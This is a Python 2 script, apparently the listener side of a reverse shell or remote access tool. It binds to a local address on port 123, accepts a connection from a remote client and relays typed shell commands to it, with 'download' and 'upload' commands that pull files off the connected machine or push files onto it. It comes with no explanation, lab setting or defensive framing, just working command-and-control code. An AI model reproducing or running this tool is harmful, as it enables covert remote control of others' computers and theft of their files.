from subprocess import *
from socket import *
import os,sys
s = socket(AF_INET,SOCK_STREAM)
p = 123
h  = '192.168.1.6'
s.bind((h,p))
nu = 99*9999
s.listen(1)
print '               Wait for connection    \n                 \n       '
data, host = s.accept()
print 'connected from ',host[0],'\n\n'
loc = data.recv(1024)
while True:
	try :
		cmd = raw_input(loc+' : ')
		if cmd[:2] == 'cd':
			data.sendall(cmd)
			loc = data.recv(1024)
			continue

		elif len(cmd) > 0 :
			if cmd[0] == ' ':
				continue
			else:
				data.sendall(cmd)
		else:	
			continue
		if cmd.startswith('download') == True:
			try:
				data.sendall(cmd[9:])
				check2= data.recv(1024)
				if check2 == 'True':
					file = open('download_'+cmd[9:],'wb')
					print 'Dowloading '+cmd[9:]
					while True:
						dat = data.recv(nu)
						if dat == "file can't open":
							print "file can't open"
							file.close()
							os.remove(cmd[9:])
							break
						while (dat):
							if dat.endswith('end') == True:
								file.write(dat[:-3])
								file.close()
								break
							else:
								file.write(dat)
								dat = data.recv(nu)

						break

				else:print 'file not found !'
				continue
						
						
						
				continue
			except:print 'erruer'	
		if cmd.startswith('upload'):
			try:
				with open(cmd[7:],'rb') as f:
					print 'uploading '+ cmd[7:]
					d = f.read()
					data.sendall(d+'end')

					f.close()
					continue	
			except:
				print "can't open file "
				data.sendall("file can't open")	
				continue
				
		dat = data.recv(nu)
		if not dat :
			print 'connection refused'
			break
		print dat
	except:
		print 'connection refused'
		data, host = s.accept()
		print 'connected from ',host[0]
		loc = data.recv(1024)
	continue	
s.close()		
